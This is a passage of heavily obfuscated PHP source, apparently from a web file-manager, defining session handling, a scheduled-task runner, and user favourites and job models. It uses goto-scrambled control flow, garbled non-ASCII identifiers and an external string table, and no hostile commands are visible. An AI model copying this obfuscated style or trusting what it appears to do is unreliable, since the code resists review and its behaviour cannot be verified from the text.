$handle; public static $data; public static function init() { goto Aí‚Š†Ôƒ”; bô¸Â ¦Ûé: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $aŠÌÆë¼º = new self(); return $aŠÌÆë¼º; goto eõ¡Ìçˆ¼Ô; fÇ‰ñõ†º‡: $fç¥õ¦„İ  = $GLOBALS[$c¾¿ÁÓó©ö[6]][$c¾¿ÁÓó©ö[347]]; self::$sessionTime = $fç¥õ¦„İ [$c¾¿ÁÓó©ö[1477]]; $b±ò¼õ§ğê = isset($GLOBALS[$c¾¿ÁÓó©ö[1478]]) ? $GLOBALS[$c¾¿ÁÓó©ö[1478]] : SESSION_ID; goto CŸÛ°ÉÒ¸Û; fî±æÌÑù: $c‚Á–£Ù¥ = $fç¥õ¦„İ [$C¢±µÃ]; $fãå¨ ¾ø = $fç¥õ¦„İ [$c¾¿ÁÓó©ö[792]]; switch ($C¢±µÃ) { case $c¾¿ÁÓó©ö[17]: self::$handle = Model($c¾¿ÁÓó©ö[793]); break; case $c¾¿ÁÓó©ö[794]: self::$handle = new CacheRedis($c‚Á–£Ù¥, $fãå¨ ¾ø); break; case $c¾¿ÁÓó©ö[795]: self::$handle = new CacheMemcached($c‚Á–£Ù¥, $fãå¨ ¾ø); break; case $c¾¿ÁÓó©ö[193]: $c‚Á–£Ù¥[$c¾¿ÁÓó©ö[76]] = $c‚Á–£Ù¥[$c¾¿ÁÓó©ö[76]] . $c¾¿ÁÓó©ö[1480]; self::$handle = new CacheFile($c‚Á–£Ù¥, $fãå¨ ¾ø); default: break; } goto bô¸Â ¦Ûé; Aí‚Š†Ôƒ”: $c¾¿ÁÓó©ö =& $_SERVER[ÒÆ›ÆØÎ¾]; static $aŠÌÆë¼º = false; if ($aŠÌÆë¼º) { return $aŠÌÆë¼º; } goto fÇ‰ñõ†º‡; CŸÛ°ÉÒ¸Û: if (self::$sessionSign) { } else { if (Cookie::get($b±ò¼õ§ğê)) { self::$sessionSign = Cookie::get($b±ò¼õ§ğê); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b±ò¼õ§ğê, self::$sessionSign, self::$sessionTime); $C¢±µÃ = $fç¥õ¦„İ [$c¾¿ÁÓó©ö[1479]]; goto fî±æÌÑù; eõ¡Ìçˆ¼Ô: } public static function sign($eéÕî¤š = false) { $eéÕî¤š && (self::$sessionSign = $eéÕî¤š); self::init(); return self::$sessionSign; } public static function set($B‰ôœÍÕÚ, $C¿íï «ë = false) { self::init(); if (is_array($B‰ôœÍÕÚ)) { foreach ($B‰ôœÍÕÚ as $dí³Áë¨Ì => $B Ôˆº‰šŸ) { array_set_value(self::$data, $dí³Áë¨Ì, $B Ôˆº‰šŸ); } } else { array_set_value(self::$data, $B‰ôœÍÕÚ, $C¿íï «ë); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($dÈôäÇÂŸ‚ = false) { self::init(); if (!$dÈôäÇÂŸ‚) { return self::$data; } return array_get_value(self::$data, $dÈôäÇÂŸ‚); } public static function remove($f°ĞëÔØË‹) { self::init(); unset(self::$data[$f°ĞëÔØË‹]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÒÆ›ÆØÎ¾][797])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto A–Â˜³ÄÒ; f®º‰ã¬‚: http_close(); self::valueSet($bÑ°Œä™±[1481], $bÑ°Œä™±[87]); Hook::bind($bÑ°Œä™±[1483], $bÑ°Œä™±[1484]); goto FĞ±Õí‰; A–Â˜³ÄÒ: $bÑ°Œä™± =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::valueGet($bÑ°Œä™±[702]) != $bÑ°Œä™±[87]) { return; } if (self::valueGet($bÑ°Œä™±[1481]) == $bÑ°Œä™±[87]) { $B†³š„àœÁ = self::valueGet($bÑ°Œä™±[1482]); if (time() - $B†³š„àœÁ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto f®º‰ã¬‚; FĞ±Õí‰: while (!0) { self::cacheClear(); if (self::valueGet($bÑ°Œä™±[702]) != $bÑ°Œä™±[87]) { self::valueSet($bÑ°Œä™±[1481], $bÑ°Œä™±[191]); self::log($bÑ°Œä™±[1485]); die; } self::valueSet($bÑ°Œä™±[1481], $bÑ°Œä™±[87]); self::valueSet($bÑ°Œä™±[1482], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto cÈ«»ÒóŠ; cÈ«»ÒóŠ: } public static function restart() { $aÔÃÎ†øÏ… =& $_SERVER[ÒÆ›ÆØÎ¾]; http_close(); self::valueSet($aÔÃÎ†øÏ…[702], $aÔÃÎ†øÏ…[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($aÔÃÎ†øÏ…[1481], $aÔÃÎ†øÏ…[191]); self::valueSet($aÔÃÎ†øÏ…[702], $aÔÃÎ†øÏ…[87]); } public static function shutdownEvent() { $BÇ‚à¹óêÜ =& $_SERVER[ÒÆ›ÆØÎ¾]; self::valueSet($BÇ‚à¹óêÜ[1481], $BÇ‚à¹óêÜ[191]); self::log($BÇ‚à¹óêÜ[1486]); } public static function config($E—§³ŒŞœ¹, $D©¿‡á¿¸) { self::valueSet($_SERVER[ÒÆ›ÆØÎ¾][702], $E—§³ŒŞœ¹); } private static function taskRunAll() { goto a‰…‰ÉÏ‹; F”‚…¢ªËİ: $cÓ‰›×£É³ = count($DÛ‰Áˆõ‘Ø); for ($aÕâÓàÕ = 0; $aÕâÓàÕ < $cÓ‰›×£É³; $aÕâÓàÕ++) { $e˜¢àˆø = $DÛ‰Áˆõ‘Ø[$aÕâÓàÕ]; if (!$e˜¢àˆø[$d‚ù‰·Õ¬¯[393]] || $e˜¢àˆø[$d‚ù‰·Õ¬¯[1488]] != $d‚ù‰·Õ¬¯[87]) { continue; } if (!self::taskTimeCheck($e˜¢àˆø)) { continue; } self::taskRun($e˜¢àˆø); } Hook::trigger($d‚ù‰·Õ¬¯[1489]); goto d–…ÇÛ¸°; a‰…‰ÉÏ‹: $d‚ù‰·Õ¬¯ =& $_SERVER[ÒÆ›ÆØÎ¾]; $CĞ»Æ‚¢Â­ = timeFloat(); $DÛ‰Áˆõ‘Ø = Model($d‚ù‰·Õ¬¯[1487])->listData(); goto F”‚…¢ªËİ; d–…ÇÛ¸°: self::taskQueueRun($CĞ»Æ‚¢Â­); self::closeDatabase(); goto eÍäš†íß˜; eÍäš†íß˜: } private static function taskQueueRun($B‡å¿°‡Ğ¼) { $FÒ×ÊíÙò« = 10; while (!0) { $AÁÜ³’©ß¸ = TaskQueue::run(); if ($AÁÜ³’©ß¸ === !1) { break; } if (timeFloat() - $B‡å¿°‡Ğ¼ >= $FÒ×ÊíÙò«) { break; } } } private static function taskTimeCheck($cÁ·öæĞ‚Š) { goto A„ÑĞÌ; CÃö»ñ‹: $CóË²·ŠØ† = strtotime($f‰›„ÑØ’–[1490] . $DòâæœÔĞõ[$f‰›„ÑØ’–[1491]] . $f‰›„ÑØ’–[1492]) - strtotime($f‰›„ÑØ’–[1493]); $e¯¹ëÓšì» = time() - strtotime(date($f‰›„ÑØ’–[1494]) . $f‰›„ÑØ’–[1495]); $aöÈÌ¹ŠÔ× = $e¯¹ëÓšì» >= $CóË²·ŠØ† && $e¯¹ëÓšì» <= $CóË²·ŠØ† + 3600; goto aæ½Ñ÷íŠ¡; A„ÑĞÌ: $f‰›„ÑØ’– =& $_SERVER[ÒÆ›ÆØÎ¾]; $DòâæœÔĞõ = json_decode($cÁ·öæĞ‚Š[$f‰›„ÑØ’–[197]], !0); $eÄãÌ†ÖÊÎ = intval($cÁ·öæĞ‚Š[$f‰›„ÑØ’–[1482]]); goto CÃö»ñ‹; aæ½Ñ÷íŠ¡: switch ($DòâæœÔĞõ[$f‰›„ÑØ’–[29]]) { case $f‰›„ÑØ’–[1496]: if (time() - $eÄãÌ†ÖÊÎ < 3600 * 24 * 30) { return !1; } if ($DòâæœÔĞõ[$f‰›„ÑØ’–[1496]] == date($f‰›„ÑØ’–[1497]) && $aöÈÌ¹ŠÔ×) { return !0; } break; case $f‰›„ÑØ’–[1498]: if (time() - $eÄãÌ†ÖÊÎ < 3600 * 24 * 7) { return !1; } $d™Ğã‘¡è‰ = date($f‰›„ÑØ’–[1499]) == 0 ? 7 : date($f‰›„ÑØ’–[1499]); if ($DòâæœÔĞõ[$f‰›„ÑØ’–[1498]] == $d™Ğã‘¡è‰ && $aöÈÌ¹ŠÔ×) { return !0; } break; case $f‰›„ÑØ’–[1491]: if (time() - $eÄãÌ†ÖÊÎ < 3600 * 24) { return !1; } if ($aöÈÌ¹ŠÔ×) { return !0; } break; case $f‰›„ÑØ’–[1500]: if (time() - $eÄãÌ†ÖÊÎ >= floatval($DòâæœÔĞõ[$f‰›„ÑØ’–[1500]]) * 60) { return !0; } break; default: break; } return !1; goto aóòß¤”ŒÅ; aóòß¤”ŒÅ: } private static function closeDatabase() { goto f®ŸÎÙÕ§®; aÄõÏ½Õàø: $b’éâÀĞá¶ = Model($D©™ÄóåÎ“[502])->db($D©™ÄóåÎ“[33]); if ($b’éâÀĞá¶) { $b’éâÀĞá¶->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($D©™ÄóåÎ“[1501], $D©™ÄóåÎ“[1502]); die; } goto bÛåêÜÊ»à; c¿Û›è¸¿: if (!$BçÍ±µÄô) { $BçÍ±µÄô = time(); } if (time() - $BçÍ±µÄô < $aÁÕß´Âğˆ) { return; } $BçÍ±µÄô = time(); goto aÄõÏ½Õàø; f®ŸÎÙÕ§®: $D©™ÄóåÎ“ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $BçÍ±µÄô = 0; $aÁÕß´Âğˆ = 1800; goto c¿Û›è¸¿; bÛåêÜÊ»à: } public static function taskRun($EöÆ‚µåÕÁ) { goto eŞÖõŠ˜ùĞ; eŞÖõŠ˜ùĞ: $B­œµ¯ã†Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; self::log($B­œµ¯ã†Œ[1503] . $EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[393]] . $B­œµ¯ã†Œ[1504] . $EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[28]] . $B­œµ¯ã†Œ[1505] . $EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[1506]]); Model($B­œµ¯ã†Œ[1487])->run($EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[393]]); goto A•î¿›¼‚¼; fØÏŞÒ£å®: Model($B­œµ¯ã†Œ[1507])->add(array($B­œµ¯ã†Œ[1508] => $B­œµ¯ã†Œ[33], $B­œµ¯ã†Œ[1509] => $B­œµ¯ã†Œ[191], $B­œµ¯ã†Œ[29] => $B­œµ¯ã†Œ[1510] . $EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[393]], $B­œµ¯ã†Œ[1511] => json_encode(array($B­œµ¯ã†Œ[28] => $EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[28]], $B­œµ¯ã†Œ[1512] => timeFloat() - $EŠŸ´³Ú¢œ, $B­œµ¯ã†Œ[291] => $F«âøÄ÷ÅŒ)))); self::log($B­œµ¯ã†Œ[1513] . $EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[393]] . $B­œµ¯ã†Œ[1514] . $F«âøÄ÷ÅŒ); return !0; goto bö—„ãÁÆ; A•î¿›¼‚¼: $EŠŸ´³Ú¢œ = timeFloat(); $F«âøÄ÷ÅŒ = $B­œµ¯ã†Œ[33]; switch ($EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[29]]) { case $B­œµ¯ã†Œ[305]: $B±Îˆó¿Øè = url_request($EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[1506]], $B­œµ¯ã†Œ[228], !1, !1, !1, !1, 5); $F«âøÄ÷ÅŒ = strlen($B±Îˆó¿Øè); break; case $B­œµ¯ã†Œ[227]: $F«âøÄ÷ÅŒ = Hook::apply($EöÆ‚µåÕÁ[$B­œµ¯ã†Œ[1506]]); default: break; } goto fØÏŞÒ£å®; bö—„ãÁÆ: } private static function valueGet($añŞ«´ôˆ) { $d—òô„Š¤å =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÀĞÅÕáÈ¬ = $d—òô„Š¤å[1515]; $B¿íÉ¥§¹ = Model($d—òô„Š¤å[1516])->get($añŞ«´ôˆ, $FÀĞÅÕáÈ¬); if (is_null($B¿íÉ¥§¹)) { Model($d—òô„Š¤å[1516])->set($d—òô„Š¤å[702], $d—òô„Š¤å[87], $FÀĞÅÕáÈ¬); Model($d—òô„Š¤å[1516])->set($d—òô„Š¤å[1481], $d—òô„Š¤å[191], $FÀĞÅÕáÈ¬); $B¿íÉ¥§¹ = Model($d—òô„Š¤å[1516])->get($añŞ«´ôˆ, $FÀĞÅÕáÈ¬); } return $B¿íÉ¥§¹; } private static function valueSet($B¸ë‹•ÃÈ¡, $E§˜ÒäÕâÍ) { $e«ÙÚø =& $_SERVER[ÒÆ›ÆØÎ¾]; return Model($e«ÙÚø[1516])->set($B¸ë‹•ÃÈ¡, $E§˜ÒäÕâÍ, $e«ÙÚø[1515]); } protected static function log($BÒÌòº‰) { write_log($BÒÌòº‰, $_SERVER[ÒÆ›ÆØÎ¾][1502]); } private static function cacheClear() { $c¥Úˆİ£…‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dé±ÔÙÖİ… = Model($c¥Úˆİ£…‡[1516])->cacheKey($c¥Úˆİ£…‡[1515]); Cache::clearMemory($Dé±ÔÙÖİ…); Model($c¥Úˆİ£…‡[1487])->cacheClear(); } } goto cº´Çõƒº¹; aä¿¦†œ¢Â: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($EÔŞ²Ùë³‘) { $aÛŒáŒÁ =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($aÛŒáŒÁ[1783] => array(USER_ID, $aÛŒáŒÁ[2102])); } protected function listData() { $bÒ‹‹¯‹—„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bĞ…ãç‹‹À = array($bÒ‹‹¯‹—„[1509] => USER_ID, $bÒ‹‹¯‹—„[463] => 0); $eÔÈôÎ»ŠÏ = $bÒ‹‹¯‹—„[2103]; $D—Ê¤åï×Ô = $this->field($eÔÈôÎ»ŠÏ)->where($bĞ…ãç‹‹À)->order($bÒ‹‹¯‹—„[2104])->select(); return $D—Ê¤åï×Ô ? $D—Ê¤åï×Ô : array(); } protected function resetCache() { } protected function listView() { goto Dë¡âŒÑ±; Dë¡âŒÑ±: $D×Í·Á¢Îò =& $_SERVER[ÒÆ›ÆØÎ¾]; $bŠÑ·†´¨ = $this->listData(); $A¢¥Ä¥Õ¢¿ = array_filter_by_field($bŠÑ·†´¨, $D×Í·Á¢Îò[29], $D×Í·Á¢Îò[409]); goto dÄé–Â÷¯Î; eªô•Ñ­æ: $bË¦”…¸âÎ = array_to_keyvalue($bË¦”…¸âÎ, $D×Í·Á¢Îò[395]); foreach ($bŠÑ·†´¨ as $EòÆÍğ’Ğ => $aÉïÄÈ¯‹Ğ) { $a‡«õ™è“è = $bË¦”…¸âÎ[$aÉïÄÈ¯‹Ğ[$D×Í·Á¢Îò[76]]]; $a‡«õ™è“è = $a‡«õ™è“è ? $a‡«õ™è“è : array(); $bŠÑ·†´¨[$EòÆÍğ’Ğ] = array_merge($a‡«õ™è“è, $aÉïÄÈ¯‹Ğ); } return $bŠÑ·†´¨; goto Díğ†ÀÛ…Ï; dÄé–Â÷¯Î: $FŒ°Óô¯í½ = array_to_keyvalue($A¢¥Ä¥Õ¢¿, $D×Í·Á¢Îò[33], $D×Í·Á¢Îò[76]); if (!$FŒ°Óô¯í½) { return $bŠÑ·†´¨; } $B¸¶¨Ş´îÈ = 2000; goto B¦êáÒ‡…; B¦êáÒ‡…: $D¡Ó±Ê¥· = array($D×Í·Á¢Îò[410] => array($D×Í·Á¢Îò[411], $FŒ°Óô¯í½)); $bË¦”…¸âÎ = Model($D×Í·Á¢Îò[782])->listSource($D¡Ó±Ê¥·, $B¸¶¨Ş´îÈ); $bË¦”…¸âÎ = array_merge($bË¦”…¸âÎ[$D×Í·Á¢Îò[74]], $bË¦”…¸âÎ[$D×Í·Á¢Îò[75]]); goto eªô•Ñ­æ; Díğ†ÀÛ…Ï: } protected function addFav($b³ğ°¨ğİ, $BøŞÕìÙ› = '', $aŒ´±†‰¶¢ = "\163\x6f\x75\x72\143\x65") { goto B×Î°¬é¹Ì; FÌÚÛ¼ª—¨: $D¿¸Ö¥» = array($F¡µÅ­ã»Ñ[1509] => USER_ID, $F¡µÅ­ã»Ñ[463] => 0); $BÏ‘ÊƒÕÅò = $this->where($D¿¸Ö¥»)->max($F¡µÅ­ã»Ñ[1704]); if (!$BÏ‘ÊƒÕÅò) { $BÏ‘ÊƒÕÅò = 0; } goto A»òîÒ¦Ó; aâ÷Ì™Ïƒ‹: return $this->add($eÅ‰÷Ë¿‹); goto EùÊ¦ó½à; A»òîÒ¦Ó: if (!$BøŞÕìÙ› && $aŒ´±†‰¶¢ == $F¡µÅ­ã»Ñ[409]) { $CñˆëŸ¼× = Model($F¡µÅ­ã»Ñ[1197])->where(array($F¡µÅ­ã»Ñ[410] => $b³ğ°¨ğİ))->find(); if (!$CñˆëŸ¼×) { return !1; } $BøŞÕìÙ› = $CñˆëŸ¼×[$F¡µÅ­ã»Ñ[28]]; } $BøŞÕìÙ› = $this->getAutoName($BøŞÕìÙ›); $eÅ‰÷Ë¿‹ = array($F¡µÅ­ã»Ñ[1509] => USER_ID, $F¡µÅ­ã»Ñ[463] => 0, $F¡µÅ­ã»Ñ[413] => $BøŞÕìÙ›, $F¡µÅ­ã»Ñ[414] => $b³ğ°¨ğİ, $F¡µÅ­ã»Ñ[415] => $aŒ´±†‰¶¢, $F¡µÅ­ã»Ñ[1685] => $BÏ‘ÊƒÕÅò + 1); goto aâ÷Ì™Ïƒ‹; B×Î°¬é¹Ì: $F¡µÅ­ã»Ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D¿¸Ö¥» = array($F¡µÅ­ã»Ñ[1509] => USER_ID, $F¡µÅ­ã»Ñ[463] => 0, $F¡µÅ­ã»Ñ[415] => $aŒ´±†‰¶¢, $F¡µÅ­ã»Ñ[414] => $b³ğ°¨ğİ); if ($this->where($D¿¸Ö¥»)->find()) { return !1; } goto FÌÚÛ¼ª—¨; EùÊ¦ó½à: } protected function remove($b†ˆ®„çè) { $D¢¶¹ÍŸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b¬æ’Ò¦Ú = array($D¢¶¹ÍŸ[1509] => USER_ID, $D¢¶¹ÍŸ[412] => $b†ˆ®„çè); return $this->where($b¬æ’Ò¦Ú)->delete(); } protected function removeByName($DÚøä³ÊìÑ) { $eÏòĞÏİ±Š =& $_SERVER[ÒÆ›ÆØÎ¾]; $A¹Ïæô¾ë¢ = array($eÏòĞÏİ±Š[1509] => USER_ID, $eÏòĞÏİ±Š[413] => $DÚøä³ÊìÑ, $eÏòĞÏİ±Š[463] => 0); return $this->where($A¹Ïæô¾ë¢)->delete(); } protected function rename($d“®„ê¸‹, $cÖ¡ „µšİ) { $AóŒÁÆÏÈÇ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($d“®„ê¸‹ == $cÖ¡ „µšİ) { return !1; } $E²®ìïÍ¦É = $this->getAutoName($cÖ¡ „µšİ); if ($cÖ¡ „µšİ != $E²®ìïÍ¦É) { return !1; } $aÌ±˜Èäª = array($AóŒÁÆÏÈÇ[1509] => USER_ID, $AóŒÁÆÏÈÇ[463] => 0, $AóŒÁÆÏÈÇ[28] => $d“®„ê¸‹); return $this->where($aÌ±˜Èäª)->save(array($AóŒÁÆÏÈÇ[28] => $cÖ¡ „µšİ)); } protected function resetSort($b¡Ë¾Ä•Ü…) { $BÈŒÎæ”ÜÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b¡Ë¾Ä•Ü… = is_array($b¡Ë¾Ä•Ü…) ? $b¡Ë¾Ä•Ü… : array(); $f­øÀ¾ƒà = array($BÈŒÎæ”ÜÒ[1509] => USER_ID); for ($AÑÔ§´à¿‡ = 0; $AÑÔ§´à¿‡ < count($b¡Ë¾Ä•Ü…); $AÑÔ§´à¿‡++) { $f­øÀ¾ƒà[$BÈŒÎæ”ÜÒ[412]] = $b¡Ë¾Ä•Ü…[$AÑÔ§´à¿‡]; $this->where($f­øÀ¾ƒà)->save(array($BÈŒÎæ”ÜÒ[1685] => $AÑÔ§´à¿‡ + 1)); } return !0; } protected function moveTop($E³ª›ÛïÑ¨) { goto dîå£îç“·; f«¢À«ãÑ: if (!$BÌ¶²©ˆØ›) { return; } $Cóäƒ­¿ùœ = $this->field($cï÷ÌÊ“„Í[393])->where($C‹ÏÜ•‹)->order($cï÷ÌÊ“„Í[2104])->select(); $Cóäƒ­¿ùœ = array_to_keyvalue($Cóäƒ­¿ùœ, $cï÷ÌÊ“„Í[33], $cï÷ÌÊ“„Í[393]); goto dõ¾˜‚; dÎÎšÌåÓõ: return $this->resetSort($Cóäƒ­¿ùœ); goto fò¨–èŠˆ; dîå£îç“·: $cï÷ÌÊ“„Í =& $_SERVER[ÒÆ›ÆØÎ¾]; $C‹ÏÜ•‹ = array($cï÷ÌÊ“„Í[1509] => USER_ID, $cï÷ÌÊ“„Í[463] => 0); $BÌ¶²©ˆØ› = $this->where($C‹ÏÜ•‹)->where(array($cï÷ÌÊ“„Í[28] => $E³ª›ÛïÑ¨))->find(); goto f«¢À«ãÑ; dõ¾˜‚: $A·ŒÆ„¸êÏ = $Cóäƒ­¿ùœ; $Cóäƒ­¿ùœ = array_remove_value($Cóäƒ­¿ùœ, $BÌ¶²©ˆØ›[$cï÷ÌÊ“„Í[393]]); array_unshift($Cóäƒ­¿ùœ, $BÌ¶²©ˆØ›[$cï÷ÌÊ“„Í[393]]); goto dÎÎšÌåÓõ; fò¨–èŠˆ: } protected function moveBottom($bŒœ»ÖÓÚ’) { $dÛõ—–÷…Ì =& $_SERVER[ÒÆ›ÆØÎ¾]; $d‚ÜµéÈÔ¿ = array($dÛõ—–÷…Ì[1509] => USER_ID, $dÛõ—–÷…Ì[463] => 0); $bã…‚Ë×”‘ = $this->where($d‚ÜµéÈÔ¿)->max($dÛõ—–÷…Ì[1704]); $aô‡¯©‘‡œ = array($dÛõ—–÷…Ì[1704] => $bã…‚Ë×”‘ + 1); return $this->where($d‚ÜµéÈÔ¿)->where(array($dÛõ—–÷…Ì[28] => $bŒœ»ÖÓÚ’))->save($aô‡¯©‘‡œ); } private function getAutoName($DŞ™ÂË¨É‡) { goto côÕºÔ„ã; DÙùŒ„ƒ£Æ: $B”®£Úëõô = array_to_keyvalue($B”®£Úëõô, $BŸƒ‘­˜½é[33], $BŸƒ‘­˜½é[28]); if (!$B”®£Úëõô || !in_array($DŞ™ÂË¨É‡, $B”®£Úëõô)) { return $DŞ™ÂË¨É‡; } for ($Eàªİˆ˜ = 0; $Eàªİˆ˜ < count($B”®£Úëõô); $Eàªİˆ˜++) { if (!in_array($DŞ™ÂË¨É‡ . "\50{$Eàªİˆ˜}\51", $B”®£Úëõô)) { return $DŞ™ÂË¨É‡ . "\50{$Eàªİˆ˜}\x29"; } } goto f³Ïƒ·ê¢÷; f³Ïƒ·ê¢÷: return $DŞ™ÂË¨É‡ . "\x28{$Eàªİˆ˜}\x29"; goto aŒ­ØÓÁª; côÕºÔ„ã: $BŸƒ‘­˜½é =& $_SERVER[ÒÆ›ÆØÎ¾]; $bšÍ‰µ±»Û = array($BŸƒ‘­˜½é[1509] => USER_ID, $BŸƒ‘­˜½é[463] => 0); $B”®£Úëõô = $this->field($BŸƒ‘­˜½é[28])->where($bšÍ‰µ±»Û)->select(); goto DÙùŒ„ƒ£Æ; aŒ­ØÓÁª: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6a\157\142\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x64\x65\x73\x63", "\163\157\162\164"); const JOB_KEY = "\163\x65\154\x66\x4a\157\x62\x4c\x69\163\164"; public function listData($Bø¡½Û±Ê” = false, $Aî¡õ…è¿² = "\163\157\162\x74", $dÆî«‘ëÊù = false) { return parent::listData($Bø¡½Û±Ê”, $Aî¡õ…è¿², $dÆî«‘ëÊù); } public function remove($F‹­Ø¤ù„) { return parent::remove($F‹­Ø¤ù„); } public function add($BŠæ‰Ëå¿Ñ) { $e›Ù¢Ê™ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->findByName($BŠæ‰Ëå¿Ñ[$e›Ù¢Ê™[28]])) { return !1; } $BŠæ‰Ëå¿Ñ[$e›Ù¢Ê™[1704]] = $this->getSort(); return parent::insert($BŠæ‰Ëå¿Ñ); } private function getSort() { $dæÃâ“ÏÏğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d”–Â‰·’± = parent::listData(); $e…¦èğ½ã¡ = array_to_keyvalue($d”–Â‰·’±, $dæÃâ“ÏÏğ[33], $dæÃâ“ÏÏğ[1704]); return empty($e…¦èğ½ã¡) ? 0 : max($e…¦èğ½ã¡) + 1; } public function update($d­ƒí‹ÅÒ‰, $F¼±÷×ÈÇô) { $E—Ö¨§„š =& $_SERVER[ÒÆ›ÆØÎ¾]; $a©ÂÊ·áâô = parent::listData($d­ƒí‹ÅÒ‰); $F˜¨°Õ›šÌ = $this->findByName($F¼±÷×ÈÇô[$E—Ö¨§„š[28]]); if (!$a©ÂÊ·áâô || $F˜¨°Õ›šÌ && $F˜¨°Õ›šÌ[$E—Ö¨§„š[393]] != $a©ÂÊ·áâô[$E—Ö¨§„š[393]]) { return !1; } return parent::update($d­ƒí‹ÅÒ‰, $F¼±÷×ÈÇô); } public function setUserJob($EÜ®†ˆ¶œá, $a˜Ö›Ç”‰”) { goto bèÆ÷¢‡¢—; bèÆ÷¢‡¢—: $e—ğ­»–Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!is_array($a˜Ö›Ç”‰”)) { $a˜Ö›Ç”‰” = array($a˜Ö›Ç”‰”); } $C”ïàÎÀÖ = parent::listData(); goto B ƒÔù™×‰; B ƒÔù™×‰: $aÜ‹—«×æÊ = array_to_keyvalue($C”ïàÎÀÖ, $e—ğ­»–Ş[28]); $DÂ†ñƒ†Œ = $e—ğ­»–Ş[375]; foreach ($a˜Ö›Ç”‰” as $D°é‰ˆ…æ…) { if ($aÜ‹—«×æÊ[$D°é‰ˆ…æ…]) { $DÂ†ñƒ†Œ .= $aÜ‹—«×æÊ[$D°é‰ˆ…æ…][$e—ğ­»–Ş[393]] . $e—ğ­»–Ş[47]; } else { $b‚×§ÔÓ‰ = $this->add($D°é‰ˆ…æ…); $DÂ†ñƒ†Œ .= $b‚×§ÔÓ‰ . $e—ğ­»–Ş[47]; } } goto D Êæ…Ì­ó; D Êæ…Ì­ó: $DÂ†ñƒ†Œ = rtrim($DÂ†ñƒ†Œ, $e—ğ­»–Ş[47]); Model($e—ğ­»–Ş[506])->metaSet($EÜ®†ˆ¶œá, self::JOB_KEY, $DÂ†ñƒ†Œ); goto E±…·×ä³; E±…·×ä³: } public function getUserJob($e†å½Â¢ôƒ) { $eíÕÅ×éÍ¾ = Model($_SERVER[ÒÆ›ÆØÎ¾][506])->metaGet($e†å½Â¢ôƒ); return $this->getUserJobInfo($eíÕÅ×éÍ¾[self::JOB_KEY]); } public function getUserJobInfo($A¡ˆºá‚ŞŸ) { goto f¿‚½‘‹“‚; Fà“µŒè¾¨: return $c¼éà÷îí; goto f„„Ìİš„±; Eø”ñ¾±ß¢: $f¬Ÿ±æçÄ = array_remove_key($f¬Ÿ±æçÄ, $cõˆè±ƒåç[194]); $c¼éà÷îí = array(); foreach ($dóõÎ¤¾Ÿ¸ as $añË¬½¢ ·) { if (isset($f¬Ÿ±æçÄ[$añË¬½¢ ·])) { $c¼éà÷îí[] = $f¬Ÿ±æçÄ[$añË¬½¢ ·]; } } goto Fà“µŒè¾¨; f¿‚½‘‹“‚: $cõˆè±ƒåç =& $_SERVER[ÒÆ›ÆØÎ¾]; $dóõÎ¤¾Ÿ¸ = explode($cõˆè±ƒåç[47], $A¡ˆºá‚ŞŸ); $f¬Ÿ±æçÄ = parent::listData(); goto Eø”ñ¾±ß¢; f„„Ìİš„±: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\165\x73\x65\x72\137\155\145\164\141", "\155\145\x74\141\x46\x69\145\x6c\x64" => "\x75\163\x65\x72\x49\x44"); protected $simpleField = "\165\163\x65\x72\x49\x44\x2c\x6e\x69\143\x6b\x4e\x61\155\145\54\156\141\155\x65\x2c\141\166\x61\164\x61\162\x2c\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($d†²Ô‚‹„) { $c¦¤¦æÊ§ =& 